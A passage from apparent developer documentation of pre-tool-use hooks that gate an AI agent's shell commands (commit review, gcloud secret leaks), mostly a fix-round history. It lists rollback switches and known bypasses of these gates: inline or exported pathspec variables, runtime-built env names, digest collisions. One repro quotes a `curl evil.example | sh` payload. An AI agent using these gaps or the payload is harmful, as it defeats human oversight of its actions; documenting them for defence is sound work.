|------|---------|--------|
| 3 | `CSA_NO_REQUIRE_PATHSPEC=1` | Falls back to the pre-"mandatory pathspec" behavior: judges the staged index directly instead of requiring `-- <pathspec>`. |
| 3b | `CSA_NO_PRECOMMIT_REVIEW=1` | Disables the pre-commit review requirement only. |
| 3c | `CSA_NO_DIRTY_CONFIG_GATE=1` | Disables the dirty-`.pre-commit-config.yaml` pre-check only. |
| 4 | `CSA_NO_COMMIT_MUTEX=1` | Disables the per-repo commit mutex only; real path-scoped claims are unaffected. |

## History

<details>
<summary>History</summary>

These are the dated corrections, fix-round narratives and machine-state notes that used to sit
inline in the sections above. They are kept word for word, in their original order, grouped under
the section they came from. They are a record, not the rule: where one of them disagrees with the
sections above, the sections above are current.

### From "The gate order": a fix-round tag in the intro paragraph

The dispatcher's own module docstring is authoritative (`pretooluse_bash.py:10-126`); it
currently runs **eleven** gates in this order (fix-round 2, finding 10: ten of them can block —
1, 1b, 1c, 2, 3, 3b, 3c, 4, 5, 5b — plus `churn_tracker` (gate 6), which structurally cannot;
`CLAUDE.md` §7 states this same "ten blocking + churn_tracker = eleven" count). A separate,
unconditional, never-blocking OBSERVER call (`issue_create_observer`, below the table) ALSO runs
on every `resolve_block()` invocation, besides those eleven — it is not part of this "first block
wins" ordering at all, since it can never contribute a block; see its own section after Gate 6.

### From "The gate order": the doc-currency note (round 6)

*(Superseded: this page now has a dedicated Gate 1b section, above.)*

**Doc-currency note (corrected, round 6 — an intervening round-4 correction of this same note
was itself wrong; see the module's own comment history for how the two prior versions each got
one gate right and the other wrong):** `### Gate 1c` (below, between Gate 1 and Gate 2) has ALWAYS
carried its own dedicated walkthrough — it is not a promise, it is present now and was present
before round 4 too. `### Gate 1b` has NO dedicated section anywhere on this page — verified by a
live heading grep of this file (`grep -n '^### Gate'`), which returns Gate 1, Gate 1c, Gate 2,
Gate 3, Gate 3b, Gate 3c, Gate 4, Gate 5, Gate 5b, Gate 6, and no Gate 1b. `block_head_overwrite.py`
(gate 1b) is documented ONLY in the gate-order table above and in its own module docstring, which
remains the authoritative per-check spec for it in the meantime (it follows the same "PURE
`decision`/`decide` core + thin `main()`" contract this page describes for every other gate). Gate
5b (added 2026-09-14) DOES carry its own section below, between Gate 5 and Gate 6.

### From Gate 1c: the tags after the lead-in "Also blocks unmasked secret-bearing describes"

This parenthetical followed that bold lead-in. The "see below" in it refers to the narrative
sections that follow in this History.

(#5890; round 2 hardened
2026-09-24; fix round hardened further the same day; round 4 widened coverage; round 6 closed 4
blockers + 4 non-blocking findings from a round-5 cold review — see below)

### From Gate 1c: fix rounds 3 to 8 (issue #5890 follow-ups)

Separately, **`--log-http`** (when it resolves TRUTHY -- ROUND 8 CORRECTION: NOT "any spelling"; the
round-4 P3-2 mitigation forms `--log-http=false`/`=no`/`=0`/`--no-log-http` are explicitly ALLOWED
and remain so) or **`CLOUDSDK_CORE_LOG_HTTP` set ANYWHERE in the
command** (`log-http-leaks-response` -- fix round: widened from a leading-env-prefix-on-the-same-
segment check to a raw-text match across the whole command, since `export
CLOUDSDK_CORE_LOG_HTTP=1; gcloud ...` / `env CLOUDSDK_CORE_LOG_HTTP=1 gcloud ...` reach the identical
property from a DIFFERENT shell segment than the gcloud call) is denied on EVERY gcloud verb this
module evaluates, not only the scheduler/run/functions family -- it prints the full HTTP response
body to stderr regardless of `--format`, so a safe-looking masked format alongside `--log-http` is
still a leak. Also denied: **`gcloud config set log_http`/`core/log_http`**
(`config-set-log-http` -- fix round: the PERSISTENT, machine-wide route to the identical leak, since
this writes the property into the active named configuration rather than scoping to one invocation;
round 3 fix round item 1: this reason now has its OWN deny-message branch, distinct from every
identity-mutation reason's "re-identifies every peer session" phrasing -- it explains the persistent,
machine-wide RESPONSE-LEAK mechanism instead, since it is a different hazard class from an account/ADC
identity change even though both are machine-wide).
Known remaining gap: a direct write of `log_http` into
`~/.config/gcloud/configurations/config_<name>` bypassing the `gcloud` CLI has no argv shape for this
gate to inspect.

**Round 3 fix round, item 2: the "does this command mention gcloud" check is now a real PROGRAM-TOKEN
match, not a whole-word TEXT match.** The prior check matched the bare word "gcloud" anywhere in the
command text, bounded only by non-letter characters -- so a command that merely NAMED this module
(`grep ... hooks/block_gcloud_identity.py`), a file literally called `gcloud.log`, or a `pytest -k`
selector naming this test module were all indistinguishable from an actual gcloud invocation, and
(combined with the CLOUDSDK_CORE_LOG_HTTP raw-text check above) were denied outright as false
positives. The check now tokenizes each shell segment, walks past any leading env-assignment prefix
and leading `env`/`sudo`/`command`/`exec` wrapper, and compares the resulting PROGRAM token (bare or
path-suffixed, e.g. `/usr/bin/gcloud`) against `gcloud` -- a segment that merely mentions the word in
a path, flag value, or unrelated text no longer counts. A segment that fails to tokenize still falls
back to the old whole-word match, fail CLOSED, matching this gate's existing untokenizable-segment
posture.

**Round 3 fix round, item 3: `--format` hints on a compound command now match the segment that
actually blocked, not merely the first segment naming any covered verb.** A command like `gcloud
scheduler jobs list --format='value(name)' && gcloud run services describe s` (the `list` is safe; the
`describe` is what blocks) used to derive its safe-format hint from the FIRST segment matching any
describe/list verb group regardless of which one actually triggered the deny -- silently returning the
`scheduler-job` hint for a `run-service` denial. The family lookup now re-evaluates each gcloud segment
the identical way `decision()` itself does and returns the family of the segment whose OWN evaluation
produced the blocking reason.

**Round 3 fix round, item 4: known deliberate-attacker gaps, documented rather than chased.** A
runtime-built env var name that only resolves to `CLOUDSDK_CORE_LOG_HTTP` at shell-execution time
(`CLOUDSDK_CORE_LOG_$(echo HTTP)=1 gcloud ...`) never appears as that literal substring in the command
text; `source`-ing a file that itself sets an identity/log-http-relevant var is invisible since this
module does no file I/O by contract; and `CLOUDSDK_CONFIG` pointed at an alternate configuration
directory sidesteps this module's entire "one shared config directory" threat model, since no check
here inspects `CLOUDSDK_CONFIG` at all. None of the three are chased here -- each needs either
executing/parsing arbitrary shell (breaking the pure-decision-function contract every sibling gate
shares) or a fundamentally different detection strategy.

The safe form to reach for is PER RESOURCE FAMILY (fix round: a single shared example only ever
passed for `scheduler-job`; round 3 fix round item 3 additionally fixed this hint being derived from
the WRONG family on a compound command, and item 5 fixed the `run-execution` hint field name -- see
below) -- e.g.
`gcloud scheduler jobs describe <job> --format='table(name,schedule,state)'` for scheduler jobs, or
`gcloud run services describe <svc> --format='table(metadata.name,status.url)'` for Cloud Run
services. The module docstring and `knowledge/gcloud_identity_is_machine_wide.md` carry the full
per-family spec.

**Round 3 fix round, item BLOCKER: the dispatcher-level deny message (the text an agent actually
reads under enforcement) previously fell back to the `scheduler-job` hint for 6 of the 7 covered
resource families regardless of which family the denied command actually matched.**
`hooks/pretooluse_bash.py`'s `_gcloud_identity_block` -- the ONLY call site reached by every live
enforcing gate-1c dispatch -- built its deny message via `bgi._message_for(reason)` with no `command`
argument, so the message's family re-derivation always returned `None` and fell back to the shared
`table(name,schedule,state)` example. An agent that followed that hint on a `run`/`functions`
describe/list was denied again by the very message meant to unblock it. Fixed by threading `command`
through to `_message_for` at that call site.

**Round 4 widened coverage:** `_DESCRIBE_VERB_GROUPS`/`_LIST_VERB_GROUPS` gained `run worker-pools
describe|list`, `run worker-pools revisions describe|list` (their own `run-worker-pool`
`_SAFE_LEAF_FIELDS` family), `run configurations describe` (reuses the `run-service` family — a
Configuration is a Service's own template history, same `spec.template` shape), and `functions
deploy` (a MUTATING verb sharing `describe`'s unmasked-full-dump default, dispatched through the same
`_DESCRIBE_VERB_GROUPS` loop, reusing the `function` family). Also new in round 4: `gcloud config set
format|core/format` and `CLOUDSDK_CORE_FORMAT` env-var overrides (`config-set-format` /
`format-env-override`), the group-level-flag PATH-READING fix (a `--region`/`--platform`/etc. token
BEFORE the verb on `run services`/`jobs`/`revisions` no longer hides the command path — see B1 below),
the SCAN-EVERY-TOKEN "is this gcloud" rewrite (replacing a fixed wrapper-token allowlist with a scan
of every argv token for the first gcloud-shaped one — see B2 below), and NESTED-TEXT EXTRACTION
(`bash -c`/`eval`/heredoc-fed-to-an-interpreter/`$(...)`/backtick spans are recursively
re-evaluated, depth-capped at 6).

**Round 6 (cold review of round 5 found 4 blockers + 4 non-blocking findings; all closed same day):**
- **B1** — the round-4 path-variant walk (the fix for the group-level-flag path-reading ambiguity
  above) had NO bound: each unrecognized flag doubled the branching frontier, with no path-length
  cap, no memoization, and no ceiling on distinct readings — measured ~10s at 22 unrecognized
  flag/value pairs, worse beyond that. Fixed with a path-length cap (no covered group is longer than
  5 elements), state memoization on `(index, path)`, and a hard ceiling on distinct readings
  (past which the walk reports the command as too ambiguous to enumerate and fails CLOSED —
  `run-path-too-ambiguous` — but ONLY when the command's own argv contains a literal
  `services`/`jobs`/`revisions`/`worker-pools`/`configurations` token; a `run deploy` padded with
  unrecognized flags can never match any covered family under any reading and is allowed, fast,
  regardless of flag count). **CORRECTED round 7 (B1-r6): this "argv contains a literal keyword"
  check was necessary but not sufficient — `run services update`/`jobs update`/`update-traffic`/
  `worker-pools update`/`jobs execute`/`services list` all genuinely DO contain a literal covered
  keyword, so they still hit the ceiling and denied at ~11-12 real flags, contradicting this exact
  paragraph's own "regardless of flag count" claim for anything but `deploy`. Fixed round 7 by
  finishing a branch the instant its PATH (not merely its length) is no longer a plausible prefix of
  any covered group — `services update` diverges at 2 elements, so it stops branching immediately
  regardless of how many real flags follow. See the round-7 section below.**
- **B2** — the round-4 mitigation-form fix for `CLOUDSDK_CORE_LOG_HTTP`/`CLOUDSDK_CORE_FORMAT`
  resolved by last-occurrence-in-text-wins, which silently allowed a "set the var, run gcloud, clean
  up" pattern (`export VAR=1; gcloud ...; unset VAR`) even though the gcloud call genuinely ran with
  the var set. Fixed: ANY truthy occurrence anywhere in the command now denies; safe only when EVERY
  occurrence is a removal or falsy assignment.
- **B3** — `bash -lc`/other clustered short-option forms, `bash -c -- '...'`, additional interpreters
  (`dash`/`ksh`/`mksh`/`fish`/`csh`/`tcsh`), and here-strings (`bash <<< '...'` and the no-space
  `bash <<<'...'` shlex glues into one token) were all unrecognized. Fixed.
- **B4** — this file, the module's own DENY REASON STRINGS list, and `gate-chain.md`'s doc-currency
  note (which round 4 itself had gotten wrong the OTHER way — see that note's own round-6 correction)
  were all stale for round 4's additions. Fixed; `run-worker-pool` added to the family list;
  `config-set-format`/`format-env-override`/`run-path-too-ambiguous` added to the deny-reason list.
- **P2-1 (non-blocking)** — the `$(...)`/backtick scanner ignored single-quoted regions and literal
  (quoted-delimiter) heredoc bodies NOT fed to an interpreter, over-blocking real idioms including
  this runtime's own `gh issue comment --body "$(cat <<'EOF' ... EOF)"` completion-comment convention
  and `git commit -F - <<'EOF' ... EOF`. Fixed by pre-computing and skipping both kinds of span before
  scanning; double-quoted regions and unquoted-delimiter heredoc bodies are still scanned (bash
  expands inside both).
- **P2-2 (non-blocking)** — an earlier argument merely ENDING in `/gcloud` as a path/flag-value
  (`docker run -v ~/.config/gcloud:/root/.config/gcloud IMAGE gcloud run services describe s`) could
  hide a REAL gcloud invocation later in the same argv. Fixed: every gcloud-token-starting slice is
  now evaluated, not just the first.
- **P2-3 (non-blocking)** — the per-family hint failed to resolve for a command blocked only via a
  wrapped or nested shape (`do gcloud run jobs --region r describe j`, `bash -c 'gcloud run services
  describe s'`), silently falling back to the generic hint, which then denied again when followed.
  Fixed by mirroring the same nested-text recursion the main decision function uses.
- **P2-4 (non-blocking)** — deliberate-attacker gaps documented in the knowledge doc's own gap list
  (piped/process-substituted text, `ssh`, an interpreted language's own subprocess call, a shell
  function wrapping gcloud, a program path held in a variable, and a newly-found gap: a
  quoted-delimiter heredoc fed to `cat` whose OUTPUT is then fed onward as a `bash -c` string via
  command substitution).
- **P3-1 (non-blocking)** — `--log-http=false` was never real gcloud-accepted advice (`--log-http` is
  a strict zero-argument boolean flag, `nargs=0`, confirmed against the live installed SDK); the real
  opt-out is `--no-log-http`. Fixed in the deny message and this module's own comments/tests.
- **P3-2 (non-blocking)** — the heredoc extractor was quadratic on an input whose OWN heredoc body
  text repeated `<<`-shaped substrings many times (~14s at 3,000 repetitions). Fixed by making the
  scan jump PAST a real heredoc's body once found (the actual linear-time fix) plus a hard ceiling on
  the number of distinct heredocs examined.
- **P3-3 (non-blocking)** — two docstrings described behavior the code did not have (a claimed
  per-nested-text error degradation that doesn't exist; a claimed call to a function that isn't
  actually called). Both corrected to match the real code.

**Round 7 (warm continuation of the round-5/6 reviewer, cold-reviewing round 6's own fix, found ONE
blocker + 6 non-blocking findings; all closed same day):**
- **B1-r6 (BLOCKER)** — round 6's own variant-count-ceiling fix denied ORDINARY Cloud Run commands
  (`services update`, `jobs update`, `services update-traffic`, `worker-pools update` at ~11 real
  flags; `jobs execute`, `services list` at 12) because the ceiling check only asked "does argv
  contain a covered keyword," never "has the path already proven it can't match." Fixed: a branch
  now finishes the instant its path (after alpha/beta-stripping) is no longer a plausible PREFIX of
  any covered `run` describe/list group (`_is_plausible_run_group_prefix`) — real commands now
  produce a handful of variants regardless of flag count, and the deny message now recommends the
  real working recovery (`--flag=value` spelling, which removes the ambiguity entirely).
- **P2-a (non-blocking)** — the P2-1 fix (round 6) was incomplete for its own worked example: the
  `$(...)` depth walk's quote-tracking had no notion of `_quoted_heredoc_skip_spans`, so an
  apostrophe inside a quoted-heredoc BODY nested inside a `$(...)` substitution corrupted the outer
  walk's quote state, denying this runtime's own `gh issue comment --body "$(cat <<'EOF' ... EOF)"`
  idiom whenever the comment text contained an apostrophe. Fixed by computing the skip spans once
  and letting the inner walk jump over them too, without touching quote state.
- **P2-b (non-blocking)** — `_env_var_assignment_or_removal_is_active` (round 6) contradicted its
  own docstring in both directions: a falsy assignment alone was never recorded as recognized (wrong
  deny), and an unrecognized mention alongside any removal anywhere resolved safe (wrong allow,
  attacker-shaped). Fixed by tracking every occurrence per-position against three recognized shape
  classes, treating anything uncovered as truthy.
- **P3-a (non-blocking)** — `_find_all_gcloud_argv_slices`'s 16-slice cap silently evaluated only
  the first 16 gcloud-shaped tokens with no signal more existed, so 20 Docker `-v
  /hN/gcloud:/cN/gcloud` mounts before a real invocation silently allowed it. Fixed: the function now
  reports truncation, and the caller denies outright rather than trusting a partial slice list.
- **P3-b (non-blocking)** — a false `<<`-shaped opener with no matching close, not interpreter-fed,
  ended the WHOLE heredoc scan (two `break` statements), so a later real heredoc was never examined.
  Fixed by resuming the scan instead of ending it — this also means the opener-count cap is now
  reachable in a case a pre-fix accidental `break` had kept fast; that is the intended, correct
  consequence, not a regression.
- **P3-c (non-blocking)** — `_in_any_span`'s callers re-tested every character position inside an
  already-known skip span one at a time, making scan cost `O(len * spans)`. Fixed with a
  `_span_end_if_in_any` helper that lets both scan loops jump straight to a span's end.
- **P3-d (non-blocking)** — `pretooluse_bash.py`'s own deny-reason-strings docstring never named
  `run-path-too-ambiguous`. Fixed.
- **P3-e (non-blocking)** — round 6's own new perf tests asserted wall-clock time, which is flaky on
  a loaded machine. Replaced with deterministic variant/iteration-count assertions.

**Round 8 (cold trust-architect review of round 7, found 2 blockers + 5 cheap P3 items; all closed
same day):**
- **B1-r7 (BLOCKER, a regression from round 7's own B1-r6 fix)** — `_is_plausible_run_group_prefix`
  ran BEFORE the alpha/beta track prefix was stripped from `path`, so `gcloud beta/alpha run
  services/jobs --region ... describe/list ...` was judged implausible on its first token ("beta"/
  "alpha" != "run") and silently allowed. Fixed by stripping one leading alpha/beta element INSIDE
  the function itself.
- **B2 (BLOCKER)** — `_single_quoted_spans` had no heredoc-body awareness, no backslash-escape
  handling, and let an unterminated span run to end-of-text -- so a prose apostrophe in ANY heredoc
  body opened a false quote span that swallowed every later real substitution, silently allowing an
  identity mutation or unmasked describe that followed an unrelated heredoc. Fixed with a new
  `_all_heredoc_body_spans` helper (jumped over wholesale before quote-tracking), backslash-escape
  handling outside quotes, and fail-CLOSED (skip nothing) on an unterminated quote.
- **P3 (cheap)** — the `untokenizable-segment-with-gcloud` message's "rewrite as balanced quotes"
  advice, wrong for 4 of its 5 actual causes, now names all five; two stale comments (a
  "LAST-occurrence-wins" claim replaced by round 7, and a retired fixed-wrapper-list description)
  corrected; the P3-c "O(len+spans)" claim was itself false (still O(len*spans) per call) -- fixed
  for real with `bisect` over pre-sorted spans; a vacuous fail-closed test and a source-text lock-in
  test were fixed/dropped; a count-based (not wall-clock) P3-c test was added.

### From Gate 3b: denial-reason tags and the `--rekey` pathspec fix rounds (GH #5886)

Fails open on any error (unresolvable repo, unreadable ledger, git error, empty diff). **Three**
denial reasons can **never** be cleared by recording a review (corrected fix-round-8, same-text
pass: this previously said "two," omitting `pathspec-outside-repo`): `unresolvable-pathspec` means
the hook literally cannot tell what content the commit would land (an unexpanded `$VAR`, an
unquoted `$(...)`/backtick substitution, a leading `~`) and the only fix is re-issuing the commit
with literal, quoted paths; `pathspec-env-set` (added fix-round-4, R6-B2, GH #5886 — see the
`--rekey` subsection below) means one of
`GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/`GIT_ICASE_PATHSPECS` is
present in the hook's own process environment, making "this content" ambiguous, and the only fix
is unsetting the variable and re-issuing the commit; `pathspec-outside-repo` (#4933) means a
token in the pathspec resolves outside the repository — almost always a shell redirect's argument
riding after the pathspec (`-- a.py 2> /tmp/e.log`) — and the only fix is ending the command at
the pathspec and re-issuing. Rollback lever: `CSA_NO_PRECOMMIT_REVIEW=1`.

**A directory-, glob-, or
magic-shaped `--paths` entry now reconstructs correctly (GH #5886, fixed 2026-09-23 across three
review rounds):** round 1 made `reconstruct_pending_diff_assuming_untracked` exclude
force-untracked files from the tracked-diff half via git's own `:(exclude,literal)<path>` pathspec
magic instead of filtering the (possibly-directory) pathspec entries themselves, which previously
double-counted a staged file under a directory pathspec. A COLD round-2 review then found
membership was still being decided **twice**: git decided the tracked-diff exclusion, but the
untracked-re-add half was decided by an in-repo Python helper (`_entry_covers_name`, since deleted)
that understood only an exact string match or a real on-disk directory prefix — nothing about git
pathspec syntax. A file matched only through a glob (`src/*.py`), git magic (`:(top)evil.py`), or
the bare root pathspec (`.`) was excluded by git on one side and rejected by the Python helper on
the other, vanishing from the reconstruction entirely; a never-reviewed file could then be staged
alongside a reviewed one and `--rekey` would carry the stale clean outcome onto content that never
included it — reproduced end to end through the real CLI and through `record_review.py`'s own
printed `--rekey` hint. Fixed by letting git decide BOTH halves: the untracked set to re-add is
simply `real_untracked (git ls-files --others) UNION force_untracked` (itself always git-derived
from `diff --name-status`'s added-paths list under the same pathspec), with no further Python
filtering at all. **The `,literal` exclude magic from round 1 remains load-bearing:** a bare
`:(exclude)` is a GLOB by default, so a force-untracked path whose literal name contains a glob
character (`*`, `?`, `[`, or the `\` glob escape) would exclude every path the pattern matches —
including tracked, modified, matched siblings never part of the force-untracked set — silently
dropping their content from the reconstruction; `,literal` disables every glob and magic
interpretation so the exclude matches only the exact path string (escaping individual characters is
not a substitute).

**A COLD round-3 review then found the byte-identical SHA256 check ALONE was never a sufficient
safety boundary (BLOCKER B1):** the untracked-material formatter feeding that digest is itself LOSSY
in ways that never surface in the digest (corrected fix-round-8, same-text pass: this previously
said "three ways" and "2000 files" — see review-ladder.md's own parallel passage for the full,
corrected four-way account and the readable-file-count arithmetic) — invalid UTF-8 is decoded with
`errors="replace"` (two different byte sequences can decode to the identical replacement-laden
string), any one file's content is read only up to an 8 MiB per-file cap (a change past that offset
never reaches the digest), and past a 64 MiB aggregate cap or `_UNTRACKED_MAX_FILES` (2000) `parts`
entries — roughly **1000 readable files**, since this formatter appends two entries per readable
file — every remaining entry collapses into a single `<capped after N entries>` marker with no
content at all. An unreadable file's stat-only rendering is a fourth lossy case (see the
"Corrected fix-round-4" sentence just below). A byte-identical digest match against a
reconstruction that hit any of these proves nothing — live-reproduced end to end through the real
CLI and the dispatcher's own `--rekey` hint with a large glob pathspec where a file past the
readable-file cap was replaced after review. **Fixed with a `lossy_sink` observation channel**
(`_format_untracked_entries`/`reconstruct_pending_diff_assuming_untracked`) that
`rekey_digest_if_only_untracked_became_staged` checks and refuses on outright, REGARDLESS of
whether the digest happens to match — the digest grammar itself is unchanged (every existing
ledger key still matches the same bytes it always did), this only adds a caller-side refusal when
the material that produced a matching digest cannot be trusted to be complete. Corrected
fix-round-4 (R6-B1): an unreadable file's stat-only rendering is now ALSO counted as lossy — a
transition to/from unreadable moves the digest via its own distinct text, but two different
genuinely-unreadable files coinciding on stat-only fields under attacker-controlled timing is
exactly the coincidence this check exists to never bet safety on.

**A COLD fix-round-4 (R6-B1) review then found a DEEPER defect in the same formatter:** the
`\n--- untracked <name> size=<n>\n` header line rendered `<name>` VERBATIM, so a filename
containing its own literal newline plus a fabricated `--- untracked <other-name>` fragment could
digest BYTE-FOR-BYTE IDENTICALLY to two separate, genuinely different real files named the
fabricated pieces — a single reviewed, weirdly-named directory entry reconstructing identically to
two ordinary staged files, one smuggling unreviewed content, live-landed end to end through
`--rekey` and gate 3b in the cold review's own repro. **Fixed by `_digest_safe_name`:** any name
containing an ASCII control character (below `0x20`, or DEL) renders as a `\0`-prefixed JSON
string (`\0` is a byte no real git pathname can ever contain) instead of the raw name —
`json.dumps` unambiguously escapes every embedded control character, quote, and backslash, so the
fabricated-boundary trick cannot reproduce itself inside the JSON string either. Every existing
name with no control character renders byte-identically to before; only the control-character case
changed.

**A COLD fix-round-4 (R7-B1) review then found that fixing the RENDERING alone was not enough:**
`_digest_safe_name` only changes how digests are computed AFTER the fix landed — a review recorded
BEFORE it existed used the old, vulnerable rendering, and `--rekey` still trusted that old digest
as proof of byte-identical content. Live-reproduced end to end (`e25.py`): record a clean review
under the pre-fix rendering, then `--rekey` it onto two ordinary staged files (one smuggling
`os.system('curl evil.example | sh')`) that reconstruct identically under the OLD rendering only —
the gate ALLOWed and the payload landed. **Fixed by stamping a digest-format version field, `dg=2`,
on every NEW `--pre-commit` and `--rekey` ledger entry** (`record_review._DIGEST_FORMAT_VERSION`)
— `--rekey` now refuses outright unless the chain's ROOT entry already carries `dg=2`; an entry
with no `dg=` field at all (every entry recorded before this fix existed, by construction) refuses,
fail-closed, exactly like the lossy-material refusals above. **The actual safety boundary is
therefore five checks together, not one:** byte-identical SHA256 equality, the plain-regular-file
mode check, the lossless-material check, the control-character-safe naming, AND the digest-format
version check.

**Round 3 tried stripping `GIT_LITERAL_PATHSPECS`/`GIT_GLOB_PATHSPECS`/`GIT_NOGLOB_PATHSPECS`/
`GIT_ICASE_PATHSPECS` from this module's OWN git subprocess calls; a COLD round-4 (R6-B2) review
found this was a REGRESSION AGAINST HEAD, not a fix, and it was reverted.** The claims made for it at
the time do not hold up: "digests disagree only in the ambient-persistent-var case, never a false
accept" was false — live-reproduced (the round-4 review's own `e24.py`) with the var set AMBIENTLY
for the WHOLE Python process running the hook (`assert os.environ.get("GIT_LITERAL_PATHSPECS") ==
"1"` at module scope — the shape of a variable already present in Claude Code's own launch
environment; an `export` in the Bash tool's shell never produces this shape (see the fix-round-8 B1
correction below), and it is not an inline prefix on the commit line either): HEAD (which never touches the git-subprocess environment) correctly DENIES it,
because HEAD's own digest computation inherits the identical var from its OWN process environment
and reads the pathspec identically to how the real commit will; the round-3 STRIPPED version instead
computed its digest under DEFAULT pathspec semantics while the real commit — which still saw the var
in its own environment — read the pathspec differently, and the gate ALLOWED where HEAD would have
DENIED.
**CORRECTED 2026-09-24 (R7-B2): the sentence that used to stand here — "closed structurally by this
module's architecture... does close the inline-prefix-on-the-command-line vector" — was ITSELF
false, not merely "misapplied," and is deleted rather than requalified.** The architectural fact it
rested on (the module re-derives pathspecs from parsed command tokens and never executes the raw
command text) is real, but it does NOT close the inline-prefix vector — it is the reason this
module can never SEE an inline `VAR=value` prefix typed on the commit line at all, which is exactly
why that vector stays open, not why it closes. `e21.py` (fix-round-4, R7-B1/R7-B2's own repro)
demonstrates this directly: `GIT_LITERAL_PATHSPECS=1 git commit -m x -- ':(top)x.py'`, run as ONE
shell invocation with the var set only as an inline prefix on that command, is ALLOWED by HEAD and
by every round-4 fix candidate — this is a live, demonstrated gap (#5892), not a
closed vector and not merely "not demonstrated." The reference to `core.literalPathspecs` as an
unstripped, still-effective safety net was also wrong: no such git config key exists (the real
per-repo equivalent, when one is needed, is the `GIT_*_PATHSPECS` env vars themselves — there is no
persistent-config counterpart this module could rely on instead).

**Fixed round-4 (R6-B2) by REFUSING WHEN SET, never stripping.** `decide()` checks
`pathspec_env_vars_present()` immediately after the command-substitution check (before any digest is
computed, needing neither `repo_root` nor `paths`) and denies with the dedicated
`REASON_PATHSPEC_ENV_SET` ("pathspec-env-set") the moment any of the four vars is present in the
environment — never clearable by recording a review, mirroring `REASON_UNRESOLVABLE`'s own contract:
this is not a review gap, it is an environment that makes the content ambiguous, and the fix is to
unset the variable and re-issue the commit. `record_review.py`'s `--pre-commit` and `--rekey` modes
run the identical check before computing or reconstructing anything, refusing with a clear message
rather than silently proceeding under a semantics that might not match the real commit.
**What this closes, and what it explicitly does not (CORRECTED 2026-09-24, GH #5886 fix-round-4
R7-B2, then corrected AGAIN fix-round-8 B1 — the R7-B2 text below still overstated what "EXPORT"
catches; see the repro that disproves it):** the PreToolUse hook that runs this module is a
SEPARATE process from the Bash tool's shell. It never inherits anything that shell sets, exports,
or persists at run time — an `export`, `env`, `VAR=value` prefix, or `set -a` all land in that
shell's (or a child process's) own environment, never in the hook's. The check can only ever see a
variable that was ALREADY PRESENT in the hook process's own inherited environment before the
gated command ran at all (e.g. set in Claude Code's own launch environment) — refusing whenever a
var is PRESENT in THIS module's own `os.environ` removes the disagreement entirely for that one
case, because neither this module nor the real `git commit` subprocess is trusted to proceed while
the var is set. **It does NOT close, and was never actually able to close, ANY variable set by the
gated command itself — including an `export` run earlier in the SAME shell invocation as the
commit, not only a `VAR=value` prefix typed INLINE on the commit line.** `pathspec_env_vars_present()`
reads the hook's own process's `os.environ`, and nothing the gated command does at its own run time
(a prefix, an `export`, `&&`-chained or `;`-separated) ever reaches that process. **This is
demonstrated LIVE, not merely a theoretical gap, for BOTH shapes:** `e21.py` (GH #5886 fix-round-4
R7-B1/B2 cold review) stages an unreviewed file under a literal-pathspec-shaped name, records a
clean review of the ordinary file only, then runs `GIT_LITERAL_PATHSPECS=1 git commit -m x --
':(top)x.py'` as one shell invocation — the gate ALLOWs and the unreviewed payload lands.
`e2e/x4.py` (fix-round-8 B1) reproduces the identical outcome for `export
GIT_LITERAL_PATHSPECS=1; git commit -m x -- ':(top)x.py'` and the `&&`-chained variant — the hook's
own `os.environ` never has the var either way, confirmed by printing `"GIT_LITERAL_PATHSPECS" in
os.environ` from inside the hook process itself, and the gate ALLOWs on both HEAD and every
round-4/round-7 fix candidate. The git CLI's own
`--literal-pathspecs`/`--glob-pathspecs`/`--noglob-pathspecs`/`--icase-pathspecs` command-line
options, and `--work-tree`/`--git-dir` redirecting which repository the real commit acts on, remain
open for the identical reason (never visible to this module's own process state). All of these are
tracked on #5892, not defended against by this check, and not claimed to be.
`decide()`'s own hint still deliberately suppresses the `--rekey` suggestion for a directory
pathspec (`_any_path_is_a_directory`), not because it structurally cannot succeed anymore, but
because a directory pathspec commonly sweeps in files beyond the ones that were ever reviewed
together, which would make the suggested command a refusal waiting to happen for a different reason;
the caller may still run `--rekey` against a directory pathspec directly.

`record_review.py --rekey` also refuses, as defense in depth, when the prior entry's own `paths=`
telemetry names a different path SET than the current `--paths` (order-independent) — a genuine
content difference there is already caught by the byte-identity check, but this catches outright
misuse (citing one review's key against a different `--paths` list) with a specific message; an
entry with no `paths=` field at all (pre-telemetry) is not checked. **BLOCKER B2 (round-3 cold
review): this check originally used exact-set equality against the STORED `paths=` field, which the
ledger truncates at 12 entries (`_MAX_PATHS_IN_FIELD`) — refusing every honest rekey of 13 or more
paths outright, since a truncated historical record can never equal a complete current one.** Fixed
by also reading the entry's own `paths_n=` (the untruncated true count, always written alongside
`paths=`): when it exceeds the 12-entry cap, this check instead requires the stored (truncated) set
to be a SUBSET of the current set AND the current set's size to exactly equal the recorded
`paths_n` — the subset half re-verifies every path the ledger could store, and the count half is
independently necessary (a subset check alone would silently accept a current set that adds an
extra, never-reviewed path on top of the honest truncated 12, live-reproduced as a smuggled path
whose content happens to contribute nothing to the diff, so the byte-identity check alone would not
catch it either). When `paths_n` is absent, unparsable, or does not exceed the cap, behavior is
unchanged: exact-set equality against the complete stored set. `paths_n=` itself counts DISTINCT
sanitized paths, not the raw `--paths` count (non-blocking fix, GH #5886 fix-round-4) — a duplicate
or sanitization-colliding entry in `--paths` no longer inflates it past what a later honest
`--rekey` of the same distinct set can match. Full mechanism, every live-reproduced fix across all
three rounds, the digest-format-version (`dg=2`) and control-character-safe-naming fixes added in
fix-round-4, and the current directory/glob/magic-pathspec behavior: `review-ladder.md`'s own
`--rekey` section.

### From Gate 6: the gate-count phrase

`CLAUDE.md` §7's "all seven blocking gates" phrase refers to gates 1, 2, 3, 3b, 3c, 4,
and 5 — gate 6 is explicitly excluded because it structurally cannot block.

### From `issue_create_observer`: the measurement behind it, rollout status, and fix-round tags

The first fragment is the end of the observer intro's sentence "...the mechanical instrument for a
measured backlog problem"; the remaining chunks are whole paragraphs, in their original order.

: 1,469 open
issues, 56.6 filed/day vs 18.8 closed, 985 open issues with no priority label, and a September
burst of 53 issues that bypassed the helper with zero labels.

**Fail-AMBIGUOUS, never fail-CLOSED** — a deliberate reversal of every blocking gate's own parse-
ambiguity posture (gate 1's `untokenizable-segment-with-git`, gate 5b's
`untokenizable-segment-with-protected-board-shape`): those gates fail closed because an
unparseable wrapper around a dangerous shape is a real bypass vector *they* must not let through.
This module can never deny anything in this commit, so there is no bypass to close — an
untokenizable segment that still carries the textual shape of a `gh`/`gh_issue.sh` create
invocation is logged as `create-observer-ambiguous` (so the eventual false-positive audit can see
